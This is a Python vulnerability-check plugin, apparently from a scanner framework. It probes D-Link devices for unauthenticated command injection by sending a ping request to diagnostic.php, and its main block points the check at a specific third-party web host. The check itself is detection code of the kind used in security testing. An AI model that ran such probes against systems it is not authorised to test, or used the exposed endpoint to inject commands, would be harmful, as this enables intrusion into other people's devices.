from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer https://www.bugscan.net/#!/x/2982

import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = 'diagnostic.php'
        payload = 'act=ping&dst=www.baidu.com'
        code, head, res, errcode, _ = curl.curl2(arg+url,payload)
        if code == 200 and '<report>OK' in res:
            output('dlink unauthenticated command injection '+arg+url,result,'hole')
    				

        del curl
        return result


def output(url,result,label):
    info = url + '  dlink  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='unauthenticated Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_bbc74422563e932563c21077eb432bc1.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__': 
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_bbc74422563e932563c21077eb432bc1.py
#/root/github/poccreate/codesrc/exp-1076.py